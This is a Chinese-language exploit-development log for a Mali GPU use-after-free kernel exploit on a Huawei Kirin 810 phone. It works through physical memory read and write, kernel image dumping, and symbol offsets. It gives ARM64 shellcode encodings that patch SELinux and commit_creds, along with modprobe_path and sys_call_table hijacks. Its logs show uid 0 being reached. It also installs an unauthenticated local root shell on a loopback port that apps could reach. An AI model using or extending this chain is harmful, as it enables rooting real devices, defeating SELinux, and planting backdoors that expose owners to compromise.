5. **缓存一致性**：GPU 写页表后，内核 `kmap()` 读线性映射可能命中陈旧 cache 行；必须 `cache_thrash(32MB)`（约 L2/L3 容量数倍）才能稳定读到新内容，否则 phase D 间歇失败。

**成功日志（2026-11-03）**：
```
phaseD: target_pa=0x9a3d9000 cpu_val=0x447564445f524541
phaseD: cfg transtab=0x113776000 memattr=0x4c8d888d8f88 transcfg=0x6
phaseD: rec0 level=0 pa=0x113776000 valid=1 first=0xde554403
phaseD: rec2 level=2 pa=0xde553000 valid=3 first=0x2
phaseD: l2_pa=0xde553000 slot=0 orig=0x2
phaseD: L2 insert ret=0
phaseD: target record 3 dump_val=0x447564445f524541
PHASE_D OK target_pa=0x9a3d9000 value=0x447564445f524541 l2_pa=0xde553000 slot=0
```
即 **任意物理 4 KB 读**（每次 dump 可批量读最多 509 页，4 MB dump 缓冲）。页表层级实测：PGD→L1(idx31)→L2(idx509/510/511)→3 张 L3。

### C-6. Phase E 进行中：内核镜像物理定位（2026-11）

**关键静态依据**（本次从 `kernel-src/HLK-AL00_HM2_opensource.tar.gz` 解出）：
- `drivers/hisi/ap/platform/orlando/global_ddr_map.h`：`HISI_RESERVED_KERNEL_CAN_RUN_BASE 0`, `END 0x10000000` → **Kirin 810 DDR 从物理 0 开始**；`HISI_RESERVED_6G_DDR_FASTBOOT_GCDA_PHYMEM_BASE 0x100000000`。
- `arch/arm64/Makefile`：`CONFIG_ARM64_RANDOMIZE_TEXT_OFFSET` 未开 → `TEXT_OFFSET = 0x80000`；注释明确“Image 在 RAM 中的字节偏移”。
- `arch/arm64/kernel/vmlinux.lds.S` + `head.S`：`. = KIMAGE_VADDR + TEXT_OFFSET; _text = .; HEAD_TEXT`，`_head`（含 `ARM\x64` 魔数@+0x38）在 `_text` 处。`kaslr.c`：**物理位置由 loader 决定，虚拟偏移随机，物理不变**。
- 因此 expect Image 基址 = `0x80000 + k*2MB`（RAM_start=0，2MB 对齐）。`image_size = _end - _text` 在 header +0x10，`text_offset` 在 +0x8（应为 0x80000），`flags` 在 +0x18（应为 0xa）。
- 设备物理地址跨度实测到 0x2168ad000（8.4 GB），说明 RAM 并非只 6 GB 低区，高区 bank 至少到 0x220000000；低 256 MB 一定是 RAM（kmap 安全区）。

**已经排除**：`0x80080000/0x80100000/0x80200000/0x80400000/0x80800000/0x81000000/0x82000000/0x84000000/0x88000000/0x90000000/0x98000000` 均无 `ARM\x64` 魔数（内容还随运行变化 → 普通内存，非内核镜像）。16 候选扫描包含 `0x08000000` 与 `0x100000000` 时 panic（`kernel_panic,fatal_exception`）→ 禁止盲扫未知 hole，必须限定在 DDR map 声明的低 256 MB。

**新 probe（2026-11 已完成，待设备上线）**：`probe/jit_write_probe.c` phase E 改为：
1. 128 个候选 `0x80000 + k*2MB`（覆盖 0..255 MB）一次 dump 扫描魔数；
2. 命中后按 `image_size` 用每批 500 页（BATCH_N）经 L2 自由槽 dump，`pwrite` 到 `/data/local/tmp/kimage.bin`（可直接 `adb pull`）；
3. 结束把用过的 L2 槽恢复为 0x2（invalid），PTE 恢复；
4. 新二进制名为 `probe/jit_write_probe_v2`（避免上次 push 后仍跑旧代码的疑云，执行前先 `md5sum` 比对）。

**下一步**：pull `kimage.bin` → `kallsyms-finder`（已安装 vmlinux-to-elf 1.4.0 + peewee，纯 Python 可用）解析 `_text/commit_creds/init_cred/selinux_state/avc_deny/sel_read_enforce` → 物理地址 = `img_base + (sym - _text)` → 复用参考实现的 permissive/root shellcode（`strb wzr,[x0]; mov x0,#0; ret` + adrp/add + `blr commit_creds`）通过 phase C 的 PTE 重定向写入内核 text/data。

### C-6b. Phase E 第一次真机尝试（2026-11-03）：JIT_FREE 处 panic

设备重启后（`sys.boot.reason=kernel_panic,fatal_exception`）自动回线一次，v2 探针 md5 校验一致后运行。日志到 `drain pool filled and released` 后无输出，`jit_free_submit()` ioctl 未返回 → 在 `kbase_jit_free()` 解引用 dangling 指针时崩溃（PANIC_ON_OOPS）。随后 ADB interface 再次消失。

**归因**：开机仅 12 分钟、load average 43（dex2oat/installd 风暴），后台 kmalloc-512 分配抢在我们 1024 个 spray region 之前占用了被 kfree 的 `kbase_va_region` 槽位，JIT_FREE 于是把外部对象当作 region 释放。此前多次成功运行都发生在设备空闲期。

**v3 加固**（`probe/jit_write_probe_v3`，md5 `63a946fddae6d67f0e33b2a4b4938829`）：
1. `wait_for_idle()`：启动 UAF 前读 `/proc/loadavg`，load1 < 2.5 才继续（每 5 s 采样，上限 10 min）；
2. 压力释放分两步：先只 munmap 4 个 chunk（128 MB 余量），立即完成 batch 0 的 32 个 region 分配 + cookie mmap 抢占槽位，之后才释放其余 12 个 chunk。缩小"eviction 检测 → 首次 region 分配"之间会被后台分配插队的窗口。

设备目前离线（ADB interface 消失，与之前的偶发问题一致），待用户重连后重跑 v3。

### C-7. Phase F 设计：纯数据写提权（避免 text patch 的 i-cache 风险）

参考实现最终阶段是 patch `sel_read_enforce` 的机器码（adrp/add + blr commit_creds(init_cred)），需要处理 i-cache 一致性；而 HM2 上 `CONFIG_MODULES=y` 且未开 `CONFIG_STATIC_USERMODEHELPER`（`kernel/kmod.c`: `char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe"`），因此可以走**纯数据写**路线：

1. `selinux_enforcing = 0`（32-bit IMMEDIATE_32 写，避免破坏相邻 4 字节）→ 内核转 permissive；
2. `modprobe_path = "/data/local/tmp/mp"`（逐字节 IMMEDIATE_8 写，规避对齐问题）；
3. `cache_thrash(32 MB)` 后触发未知 binfmt（`execve` 一个 `ff ff ff ff` 文件）→ `request_module("binfmt-xxxx")` → `call_modprobe()` 以 init_cred 执行我们的脚本 `/data/local/tmp/mp`（`UMH_WAIT_PROC`）。

脚本写 `id` / `enforce` 到 `/data/local/tmp/mp.out`，探针随后读出作为 root 证据。路线不需要 KASLR 虚拟基址、不需要 i-cache flush。

**符号偏移的获取与注入**：phase E 的 `kimage.bin` 用 `tools/mk_koffs.py`（封装 kallsyms-finder）解析出相对 `_text` 的偏移，写 `koffs.txt` 推到 `/data/local/tmp/koffs.txt`；探针 phase F 运行时读取。偏移对同一内核构建 KASLR 不变，可跨重启复用。物理地址 = `img_base + off`（`img_base` 为本次运行 phase E 扫描到的 Image 基址）。需要的符号：`selinux_enforcing`、`modprobe_path`（`commit_creds/init_cred/sel_read_enforce/avc_deny` 一并导出，留给 text-patch 备选）。

**phase F 的 GPU 写实现**：复用 phase C 的 PTE 重定向（把 `pt[k]` 指向目标物理页、写 `cand[v0]+kx*PAGE+off`、恢复）。`kx` 取 L3 表中未使用且未被 phase C/D/E 用过的槽位，避免 GPU TLB 中的旧翻译。新增 `gpu_write8/32`、`phys_write32/phys_write_bytes/phys_write64s`。

**新二进制**：`probe/jit_write_probe_v4`，md5 `e6cdb4e504bc808e2c076bffccac12d9`；helper 脚本 `probe/mp.sh`。设备在线后的执行顺序：push v4 + mp → 首跑（phase E 产出 kimage.bin，phase F 因无 koffs 自动跳过）→ pull kimage.bin → `python tools/mk_koffs.py kimage.bin koffs.txt` → push koffs.txt → 再跑一次 v4 完成 phase F。

### C-8. Phase E 真机打通：L2 页身份、重试策略与 keepalive（2026-11-03）

**v5 运行（md5 `62f2eee8aa0fe3367b4e426b070d0229`，freed_idx=0，l2_pa=0x101c61000）**首次给出了完整 MMU dump 记录链：

```
rec0 lv0 pa=0x9f0f9000  pgd
rec1 lv1 pa=0x101c62000
rec2 lv2 pa=0x101c61000  <- 被劫持的 L2
rec3 lv3 pa=0x20d018000  <- alias 页：entry 509/510/511 = c421b443/c421c443/c421d443
rec4 lv3 pa=0x20d016000  (512 valid)
rec5 lv3 pa=0x101c60000  (8 valid)
```

结论：`alias[freed_idx]` 的 25 页里能拿到的是 **fd2 的 L3 表**（phase C 的 `pt`，即 `alias + pgd_idx*PAGE`），而 **L2 表（0x101c61000）不在 alias 里**——mirror 扫描永远不可能命中，v5 的 CPU-alias 方案对 L2 无效。L2 只能通过 fd 的 GPU 写（PTE[k] 重定向 + fd2 WRITE_VALUE）修改。

**v4 批量丢 8 个槽位的真正解释**：两次不同批次（2MB 步进的 scan 与 4KB 步进的 image 批次）都在 **槽位 56..63（页内偏移 448..511，正好一条 64B cacheline）** 丢失，且 PA 不同——是槽位固定、非 PA 相关。此后确认这是 GPU 页表写与驱动 `kmap()` 读之间的缓存可见性问题，不是 job 丢失。

**v6 设计（`probe/jit_write_probe_v6`，md5 `115ea8b264347cd21934be09cd34e3ac`）**：
1. `dump_phys_batch()` 改为按 PA 匹配 + **缺失槽位单独重写并重试（最多 4 轮）**；实测 scan 首轮 472/500、次轮 500/500，26 批 image dump 全部完整（52,568,064 字节）。
2. **不再恢复 L2 槽位**。GPU 写入与 CPU kmap 读取的缓存状态无法可靠判定，任何"读回是 0x2"的验证都可能被骗；而残留 foreign descriptor 在 context teardown 时会走 `mmu_teardown_level` 释放任意页 → `PANIC_ON_OOPS`（v4 退出后 panic 的原因）。现在只要写过 L2 槽位就置 `g_dirty_l2`，main 末尾进入 **keepalive 死循环**，整个进程/context 泄漏不释放；设备重启才算清理。
3. phase E 若发现 `/data/local/tmp/koffs.txt` 已存在则跳过 image dump，只做 128 槽扫描拿 `img_base`。

**kimage.bin**（md5 `74a98dc7a660e4f6518f14ed97be5195`，52,568,064 字节）：ARM64 Image header 有效（+0x8 text_offset=0x80000，+0x10 image_size=0x3222000，+0x38 `ARMd`）。设备侧无 panic，uptime 正常，探针 pid 6794 处于 keepalive。

**kallsyms 解析插曲**：kallsyms-finder 报 `4 candidates for kallsyms_token_table`（raw 物理镜像里有四段都匹配 "0\0..9\0" 启发式）→ 新增 `tools/kallsyms_raw.py`：对每个候选，把其余候选在镜像副本里改成 `01 01` 使搜索唯一，交给 vmlinux-to-elf 的 `KallsymsFinder` 解析，再用 `_text/commit_creds/modprobe_path/selinux_enforcing` 是否存在来挑选正确候选。

### C-9. Huawei SELinux 加固与 phase F 改为代码补丁（2026-11-03）

**纯数据路线被证伪**：`selinux_enforcing` / `selinux_state` 在 kallsyms 中完全不存在（mk_koffs.py 报 missing），进一步反汇编确认是华为有意加固：

- `/sys/fs/selinux/enforce` 的 file_operations 中 `.read = sel_read_enforce`（唯一数据 xref，VA `0xffffff85790660d8`；llseek 在其前 8 字节），`.write = NULL`（setenforce 路径编译时移除）。
- `sel_read_enforce.cfi` 真实函数体（VA `0xffffff8577b474b8`）并不读变量，而是 `scnprintf(tmp, 12, "%d", 1)`——**常量 1**。
- `get_selinux_enforcing.cfi`（`0xffffff8577b64e1c`）为 `mov w0,#1; ret`。
- 结论：读文件永远得到 1，且内核里没有可写的 enforcing 变量。~~`modprobe_path` 写也永远不可达（`capable(CAP_SYS_MODULE)` 检查发生在 avc 之后仍需 permissive 才会被放行）~~ —— **该判断已被 C-10 证伪**：execve 未知 binfmt 触发的 `request_module` 不走 CAP_SYS_MODULE，modprobe_path 在 enforcing 下依然可被改写并触发，helper 以 init_cred、`u:r:kernel:s0` 运行。

**因此 phase F 改为 text patch（参考实现的思路），并做成 KASLR 无关**：

1. `avc_denied`（`_text+0x6b866c`，VA `0xffffff8577b3866c`）→ `mov w0,#0; ret; nop`（`0xd2800000, 0xd65f03c0, 0xd503201f`），所有拒绝返回 0 = permissive。
   > **纠错**：先前设计为 `strb wzr,[x0]`，但反汇编确认 HM2 的签名是 `avc_denied(ssid, tsid, tclass, requested, driver, xperm, flags, avd)`——**x0 是 ssid（小整数），不是可写指针**，`strb wzr,[x0]` 会写近零地址直接 oops。该版本没有 `selinux_state` 参数，enforcing 检查也已编译掉（第二个早退只看 `avd->flags & AVD_FLAGS_PERMISSIVE`），所以只需改返回值。调用点 `avc_has_perm_noaudit.cfi+0x114`（`bl avc_denied` 后 `mov w20,w0` 直接返回）已核实。
2. `sel_read_enforce.cfi` 函数体前 32 字节 → 8 条 shellcode：`adrp/add x0, init_cred; adrp/add x8, commit_creds; stp x29,x30,[sp,#-16]!; blr x8; ldp x29,x30,[sp],#16; ret`。读 `/sys/fs/selinux/enforce` 即在调用进程上 `commit_creds(init_cred)`。
3. `modprobe_path = "/data/local/tmp/mp"` 仍写（备用 helper 触发路径）。

**KASLR 无关的关键**：patch 里的 ADRP/ADD 立即数只按 `_text` 相对偏移编码（镜像基址页对齐，页内偏移与 VA 无关）：

```
mk_adrp(rd, pc_off, label_off): d=(label_off>>12)-(pc_off>>12); 0x90000000|rd|immlo<<29|immhi<<5
mk_add_imm(rd, rn, label_off):  0x91000000|((label_off&0xfff)<<10)|rn<<5|rd
```

实算结果（`off_body=0x6c74b8, off_init=0x2bb5b18, off_commit=0x19b0da8`）：`d0012760 912c6000 b0009748 9136a108 a9bf7bfd d63f0100 a8c17bfd d65f03c0`，与手工汇编一致。`commit_creds` 符号指向 `b commit_creds.cfi` 跳板，`.cfi` 体开头是 `stp`（无 PAC），`blr` 调用安全。

**写机制**：复用 phase C 验证过的 PTE 重定向。选 reserve 区域内部的一个有效 L3 叶子槽 `t`（保证 `cand[v0]+t*PAGE` 对 job 校验是合法 region VA），把 `pt[kt]` 指向 `target_pa|0x443`，用 fd2 的 WRITE_VALUE 在 `cand[v0]+kt*PAGE+off` 写；**反向写 word**（首条指令最后落地，避免半写窗口执行到坏指令）；写完恢复 `pt[kt]`。验证读用 phase E 留下的 `k` 槽（指向 `g_l2_pa`）+ `dump_phys_batch`。

**koffs.txt**（md5 `8ed47c7e93be2b4faabb3e36df86d481`）：`_text 0`、`commit_creds 19b0da8`、`init_cred 2bb5b18`、`sel_read_enforce_cfi 6c74b8`、`sel_read_enforce 19d2acc`、`avc_denied 6b866c`、`modprobe_path 2bb6058`、`commit_creds_cfi 1124ac`。工具：`tools/mk_koffs.py`（kallsyms 文本→偏移）、`tools/dis_cfi.py VA [len]`（按 VA 反汇编 kimage.bin 并解析 adrp/adr+add/ldr/str 到最近符号）。

**v7 两次 panic（md5 `cdc4df258b76281ccda03e9b4cf282e7`）**：run1 chunk 54（pressure 1248 MiB）、run2 chunk 65（pressure 1600 MiB）被驱逐，均在 JIT_FREE 处 panic（日志止于 "drain pool filled and released"）。对照 v6 成功运行在 **chunk 99 / 2688 MiB** 驱逐（系统已稳定）。诊断：开机后 1–4 分钟即运行，UAF 释放的 kmalloc 槽被开机后台分配抢走 → 后续 `kfree` 命中错误对象。结论：**必须在系统settled后运行**。

**v8（md5 `45533550cd7f551d3ad96cc347743db8`，未上机即被 v9 取代）**：`wait_for_idle()` 前置 uptime gate（`/proc/uptime >= 900 s`，60×30 s），之后仍走原 runnable≤3 轮询。第二次 panic 后设备离线，等待重新上线。

**v9（md5 `980328ec94a0d2931239f97097020406`，待上机）**：
1. 修正 `avc_patch` 为纯返回补丁（见上）；
2. avc/body 两页写入后**合并验证并重试最多 3 轮**（`dump_phys_batch` n=2，PA 匹配 + memcmp）；三个补丁各用**独立页表槽**（`t/t2/t3`，均为合法叶子），避免 GPU TLB 把后两笔写入串到第一目标页；
3. 触发阶段**取消 CPU0 绑定**，逐核 `sched_setaffinity` 后读 enforce，直到某个核的 i-cache 不再命中旧 stub、`getuid()==0`；每核打印结果；
4. 成功后 fork `rootd.sh` 建立持久 root 命令通道（轮询 `/data/local/tmp/rootcmd` → 执行 → `/data/local/tmp/rootout`）；modprobe helper `mp.sh` 也会 `setsid` 启动同一通道。

### C-10. v9 真机结果：完整链 + uid 0 root 通道（2026-11-03）

**v9（md5 `980328ec94a0d2931239f97097020406`）在 uptime 12416 s 的 settled 设备上跑通全链，无 panic**：chunk 101（pressure 2752 MiB）驱逐 → 1024 个 native 区域喷涂 → `JIT_FREE submit ret=0` → `spray[2] commit value=0` → `find_freed_idx -> 2` → `find_pgd idx=23` → PHASE_B/C/D/E 全部 OK。phase E：`IMG base=0x80000 size=0x3222000`；koffs 已在设备上，跳过 image dump。

**phase F 结果**：

- 计算出的目标物理地址：`body=0x7474b8`、`avc=0x73866c`、`mp=0x2c36058`；三笔 `phys_write32s` 均返回 0。
- **数据写确认落地**：触发后 `/proc/sys/kernel/modprobe` 读到 `/data/local/tmp/mp`，bogus binfmt 触发内核以 init_cred 执行了 helper。说明 `img_base + koffs` 的 PA 约定和 WRITE_VALUE 写路径都正确。
- **root 进程/通道确认**：helper 启动的 `rootd.sh`（pid 8735，uid 0，`u:r:kernel:s0`，CapEff `0000007fffffffff`）常驻；新增的 `rootsrv`（pid 12088）在 127.0.0.1:45679 提供 uid 0 交互 shell。主机 `adb forward tcp:45679 tcp:45679` 后连接即得 `uid=0(root) ... context=u:r:kernel:s0`；`dd if=/dev/block/by-name/boot of=<shell 侧预建文件> bs=1M count=2` 成功，头部 `41 4e 44 52 4f 49 44 21`（`ANDROID!`）。
- **文本补丁未生效（行为证据）**：patch 之后 `setcon u:r:shell:s0`、`setprop`、写 `/sys/fs/selinux/load` 仍全部失败；读 `/sys/fs/selinux/enforce` 仍为 `1` 且 uid 未变。不是 PA 计算错误（同机制的数据写已生效），而是代码补丁未被执行到：`avc_denied` 是热路径、`sel_read_enforce` 在 boot 时已被读过，CPU i-cache 保留了旧指令。`cache_thrash(32 MiB)` 只能影响 D-cache，无法无效化 i-cache。
- **v9 验证 `match=0` 是假阴性**：verify 用 `memcmp(vbuf, patch, ...)`/`vbuf+PAGE` 比较**页首**，而补丁在页内 `pa_avc&0xfff=0x66c`、`pa_body&0xfff=0x4b8`。日志里的 `avc=b9401268 320003e0 11000508`、`body=aa0003e1 910083e2 72a02804 aa1403e0` 与 kimage.bin 文件偏移 `0x6b8000`/`0x6c7000` 的页首字节**逐字节一致**——恰好证明 dump 读到了正确的物理页。v10 应改为 `vbuf + (pa & 0xfff)` 比较，并打印页内补丁处内容。

**SELinux 硬化的最终结论（config/hlk_config.txt + 反汇编）**：

- `CONFIG_SECURITY_SELINUX_DEVELOP` 未设置 → `enforcing_enabled()` 被编译成常量 1；`avc_denied` 反汇编里**根本没有 `selinux_enforcing` 载入**（只剩 `AVC_STRICT` 与 `avd->flags & AVD_FLAGS_PERMISSIVE` 两个早退）。因此不存在可写的 enforcing 变量，唯一的数据面开关是策略里的 per-domain permissive 位。
- `CONFIG_MODULE_SIG_FORCE=y`（Huawei 签名密钥），无法 insmod；`CONFIG_SECURITY_SELINUX_DISABLE`/`DEVMEM`/`PROC_KCORE` 均未设置；`/data` 为 `nosuid`；设备策略文本中没有任何 `(typepermissive ...)`，且 kernel domain 无 `security load_policy`，故 permissive 策略加载与 setcon 都不可行。
- 结论：**uid 0 + 全 capability 已拿到，但 SELinux 仍为 enforcing，进程停留在 `u:r:kernel:s0`**。写入受策略限制（如无法 setprop / 改 /system / 切域）；这不是 DAC root 的完整形态，但足以读 raw 分区、读写被允许的数据、执行任意 root 命令。

**/data 的 FBE 细节**：helper 血统（call_usermodehelper → rootd → rootsrv）**新建文件后的首次写入返回 ENOKEY**（`Required key not available`，FBE 会话密钥不在该进程 keyring），但**写已存在的文件正常**。这也解释了 04:27 的 `mp.out`/`rootd.pid`/`rootsh` 为何是 0 字节。实用绕法：先在 adb shell 侧 `touch` 目标文件（shell 有密钥），再由 root 写入/覆盖。

**通道与使用**：

- 设备侧同步命令：`adb shell /data/local/tmp/r id`（`r` 原子发布 rootcmd 并等待完成标记，输出走 rootout；daemon 每秒轮询）。
- 主机侧交互 shell：`python probe/rootshell.py`（默认 45679；自动 `adb forward`）。
- 兜底：`/data/local/tmp/mp` 已更新为同时 `setsid` 启动 rootd.sh 与 rootsrv；modprobe_path 仍指向它，重新执行 `ff ff ff ff` 触发文件即可重启两个 daemon。
- **不是 su / 不能授权给 App**：rootd 与 rootsrv 都不鉴权；普通 App 写不了 `/data/local/tmp`，但 `untrusted_app ∈ netdomain` 且有 `name_connect` 到 port_type，理论上可直连 `127.0.0.1:45679`（待真机实测），等于本地 root 后门。执行身份固定 uid 0 / `u:r:kernel:s0`，不 setuid 回调用者，FBE 下访问 app 数据 ENOKEY，也没有 su 入口。细节见 `docs/USAGE.md` 2.5。
- **稳定性红线**：探针 pid 8728 处于 keepalive（L2 有 foreign descriptor），**绝不能 kill**；重启设备会清掉 root 通道，需重新跑 `run_v9.sh`（settled、uptime ≥ 900 s）。

### C-11. v10：修正验证 + sys_call_table 纯数据提权（2026-11-03）

**目标**：回答 v9 留下的问题——代码补丁到底是"没写进去"还是"写进去但 CPU 没取指"；同时给出一条不依赖 i-cache 的提权路径。

**sys_call_table 的定位（kallsyms 里没有该符号）**：

1. 在 kimage.bin 中按 `sys_read`/`sys_write` 相邻指针签名搜索（表项 63/64），得到候选文件偏移 `0x1b92000`；同时按 56/57 = `sys_openat`/`sys_close` 和 292 项范围校验，排除 compat 表等巧合。
2. 用 `el0_svc_naked`（VA `0xffffff8577483b8c`）反汇编交叉确认：`adrp x27, 0xffffff8579012000`、`mov w25, #0x124`（292）、`ldr x16,[x27,x26,lsl#3]; blr x16`——这就是分派用的表，且**间接调用点没有 CFI/类型检查**。
3. 表项扫描：`sys_ni_syscall`（`_text+0x19e5c74`，`mov x0,#-0x26; ret`）占用 51 个空槽，包括 **244、262、282、289、290**。

**mk_koffs.py 已扩展**：自动扫描 kimage.bin 并输出 `sys_call_table 1b92000`，同时新增 `prepare_kernel_cred 19aaf80`、`sys_ni_syscall 19e5c74`。

**phase G（纯数据提权）设计**：

- 通过 dump 读系统调用表所在物理页（`img_base+0x1b92000`），检查 `entry244 == entry262 == sys_ni`，再用 `rt_text = entry244 - off(sys_ni)` 恢复运行时 `_text`（KASLR slide 自动抵消）。
- 把 `entry262` 写成 `rt_text + off(commit_creds)`，验证读回一致后执行 `syscall(262, rt_text + off(init_cred))`——内核自己完成 `commit_creds(init_cred)`，HKIP 记账保持正确；随后把表项恢复成 `sys_ni_syscall` 并验证。
- **全程在 fork 出的子进程里做**：若 HKIP 杀进程，只死子进程；父进程仍持有脏 L2 表并继续 keepalive。子进程若失败/被杀，父进程负责恢复表项，再走 modprobe 兜底。
- 好处：只改 `.rodata`（D-cache 一致），完全不碰 text，彻底绕开 i-cache。

**v10 其它修正**：phase F 验证改为 `vbuf + (pa_avc & 0xfff)`、`vbuf + PAGE + (pa_body & 0xfff)` 比较并打印页内内容；新增 `kt4` 独立页表槽；modprobe 触发仅在 `phaseg.ok` 不存在时执行；`run_v10.sh` 一键化（门控、残留探针检测、md5 校验、预建 FBE 文件、日志镜像、root 通道自检）。

**v10 真机结果（2026-11-03，md5 `5855a970e42476241dcdd7ad2f97ed12`）**：

- 全链（UAF → 别名 → dump → 物理写）照常跑通，phase F/phase G 均有输出，设备无 panic。
- `slots=510/511/510/511`；**avc 补丁落地**：`avc@66c=d2800000 d65f03c0 d503201f`，且 dmesg 出现大量 `avc: denied ... scontext=u:r:kernel:s0 ... permissive=1` —— 说明代码写原语、补丁编码和取指都**没有问题**，v9 的 i-cache 理论被否定。
- **body 补丁未落地**：`body@4b8=d10143ff f90013f5 a9034ff4 a9047bfd`（原指令），3 次重试后 `match=0`。avc 用 kt=510 写入成功、body 用 kt2=511 写入失败；modprobe_path（kt3=510）写入也成功。结论：**只有第一个空闲页表槽（510）的重定向会被 GPU 认可，511 的写入被静默丢弃**。v9 的 body 补丁（510/511/510 时同理）从未落地。
- **phase G 子进程 SIGSEGV**：`phaseG: table=0x1c12000 e244=ffffff8ca7465c74 e262=ffffff8ca7465c74`、`text=0xffffff8ca5a80000 commit_creds=0xffffff8ca7430da8 init_cred=0xffffff8ca8635b18`（表项与 KASLR 还原全部正确），随后 `child status=0xb rootd=not-started`——子进程在第一次 `phys_write32s` 内即崩溃。kbase 上下文属于 fork 前的父进程，子进程不能直接做 Mali 事务。
- 兜底通道正常：modprobe_path 写入落地，helper 以 init_cred 启动 rootd/rootsrv，`r 'id'` 返回 `uid=0(root) u:r:kernel:s0`。`phaseg.ok` 缺失（FBE + 子进程崩溃）。
- 归档：`probe/archive-v10/`（jit_write.log、rootout）。

**v11 修正（md5 `66ca37870032444ac9846e60df910700`）**：

1. phase F 的 avc/body/modprobe 三笔写**全部使用唯一已验证有效的槽 kt（=510）**，每次调用由 `phys_write32s` 自行恢复，不再使用 511。
2. phase G 重排：**表项 262 的写入、验证、恢复全部在父进程完成**；fork 出的子进程只执行 `syscall(262, va_init)` 并在 uid 0 时写 `phaseg.ok`、拉起 rootd.sh/rootsrv，不做任何 Mali I/O。父进程等待子进程（30 s 超时）后再恢复槽位。
3. `phaseg.ok` 由 `run_v11.sh` 预先 `touch` 并截断为空（FBE：helper/root 血统不能新建文件）；探针改为**读取内容 `1`** 判定成功，modprobe 兜底也以此为条件。
4. `probe/run_v11.sh` 一键驱动：残留探针检测（必须先重启）、uptime ≥ 900 s 门控、push + 设备 md5 校验、清理旧标记（保留 FBE 预建文件）、后台启动、日志镜像、root 通道自检。

**v11 真机结果（2026-11-03 18:40，md5 `66ca37870032444ac9846e60df910700`）**：

- 全链无 panic；`slots=510/510/510/510`。
- **phase G 完全成功**（纯数据提权路线首次打通）：`table=0x1c12000 e244=e262=ffffff94da265c74` → `text=0xffffff94d8880000`；父进程把 entry262 写到 `commit_creds`，`verify got=ffffff94da230da8 match=1`；子进程 `syscall(262, init_cred)` 返回 `rc=0 errno=0 uid=0`；`rootd=6548 rootsrv=6549` 启动；`child status=0x0 uid-ok=yes`；`slot restored`；随后 keepalive。`r 'id'` 输出 `uid=0(root) gid=0(root) context=u:r:kernel:s0`，`rootsrv` 在 45679 监听。归档见 `probe/archive-v11/`。
- **body 补丁仍未落地**：同一槽 510、同样机理，avc 写后 verify 立即看到 `d2800000 d65f03c0 d503201f`，body 却始终是原指令（`match=0`）。这否定了"槽 511 不可用"的假设；剩下两种解释：(a) GPU 写被陈旧 TLB 条目送到了别处；(b) 写确实进了 DRAM，但 CPU kmap 读到的是陈旧（clean）缓存行，verify 是假阴性。
- **SELinux 边界不变**：phase F 的 enforce 读取未触发 root（uid=2000），与 body 补丁不可见一致。
- rootd.sh 起始两行报 `Required key not available`（commit_creds(init_cred) 会把 keyring 替换成空的 init keyring，FBE 密钥丢失），但轮询循环本身可用：`rootcmd` 执行、`rootout` 追加、`mv rootcmd.done` 均正常。重启后仍建议用 `r` 包装器驱动。

**v12（缓存一致性实验，md5 `5469060334c40680dacb553e7d3e1692`）**：

- 顺序改为 phase G 先跑（root 通道稳定建立），新增 phase H 回答"body 补丁到没到 DRAM"：把 `sys_call_table[262]` 依次改指向 `__inval_dcache_area`（丢弃两页陈旧 D-cache 行）和 `flush_icache_range`（清 D + 失效 I），用 `syscall(262, ...)` 直接执行，再在 cpu0..7 上读 `/sys/fs/selinux/enforce`。若补丁在 DRAM，这一次读就会执行 `commit_creds(init_cred)` 使父进程变 uid 0。
- phase F 的 verify 增加交叉偏移打印：`x_avc_at_body`（avc 页 0x4b8）与 `x_body_at_avc`（body 页 0x66c）。若 GPU 写被陈旧 TLB 送到 avc 页，`x_avc_at_body` 会显示 `d0012760`。
- koffs 新增 `flush_icache_range 19debc0`、`inval_dcache_area 19decbc`（mk_koffs.py 同步）。
- **v12 结果：设备 panic**。日志停在 `phaseH: inval hook ret=0 ok=1`（钩子安装与物理读回都成功），随后 `syscall(262, patch_page, PAGE)` 进入 `__inval_dcache_area` 即重启，boot reason `kernel_panic,fatal_exception`。反汇编 kimage.bin 确认该函数的对齐内部路径用 `dc ivac`（0x19decfc），对只读内核 text 无写权限 → data abort。**结论：不要用 `__inval_dcache_area` 清理 RO text；`flush_icache_range` 在本 build 里 D-clean 分支被 alternative 跳过（0x19debc4 `b .+0x34`），运行时只执行 `ic ivau`，对 RO 页安全。**

**v13/v14：L2 块描述符通道（解决二次重定向失效）**

- v10/v11/v12 的 L3 叶子写入规律：每个 2MB 块内"第一次"重定向生效（v10 avc、v11 modprobe），同一页表的第二个空闲叶子（511）或同一叶子的第二次改指向被静默丢弃 → GPU 页表 walk 缓存复用旧翻译。
- v14 改为 **level-2 2MB block descriptor**：Mali 编码 `0x441`（valid|ACCESS|RW，`ENTRY_IS_ATE_L02=1`），驱动 `kbase_mmu_insert_pages_no_flush` 对 huge page 也用 level 2，合法。用 pt[k]=g_l2_pa|0x443 把 L2 表页当数据映射到 `l2_win`，在 L2 槽 500/501 写入块描述符，对应 2MB VA 窗口线性映射物理块，任意偏移/次数都不受 walk 缓存影响。
- 真机验证（v14 日志）：`phaseD: L2 insert ret=0`；`phaseF: hook write ret=0 / hook verify 244=ffffff...ebc0 / text write ret=0 / text verify ok @4b8 [d0012760 912c6000 b0009748 9136a108]`。**块描述符通道成立，文本补丁按预期写进 DRAM 的目标页。**

**v14 真机结果（文本补丁执行已被证明）**

- 第一次运行（含 inval 钩子）在 trigger 处 panic，原因同上。
- 第二次运行（去掉 inval，仅 `flush_icache_range` + 逐核触发，md5 `6e145f213efefacc6d52a28f260ca74c`）：日志到 `phaseF: trigger enforce, uid=2000` 为止，但**探针进程本身已是 root**：`/proc/11789/status` 显示 `Uid: 0 0 0 0`、`Gid: 0`、`CapEff: 0000007fffffffff`、`/proc/11789/attr/current = u:r:kernel:s0`；phase G 被跳过（`text_root=1`）。唯一可行路径就是被补丁的 `sel_read_enforce.cfi` 执行了 `commit_creds(init_cred)`。**至此问题 2 有了肯定答案：文本补丁既落到 DRAM，也被 CPU 取指执行；v9 的 i-cache 失败是验证/通道问题，不是取指问题。**
- 同一运行的缺陷：`run_v14.sh` 在启动前 `rm` 了 `jit_write.log`，而 `commit_creds(init_cred)` 把 session keyring 换成空的 init keyring；此后再 `open()` `/data/local/tmp` 下的文件会 ENOKEY 甚至阻塞在 key request，因此提权后的所有 `mark()` 丢失，`start_root_channel()` 的两个 fork 子进程成了 zombie，root 通道没起来。证据归档 `probe/archive-v14/`（ps/status/attr、host 日志）。

**v15（修正提权后 I/O 与持久通道）**

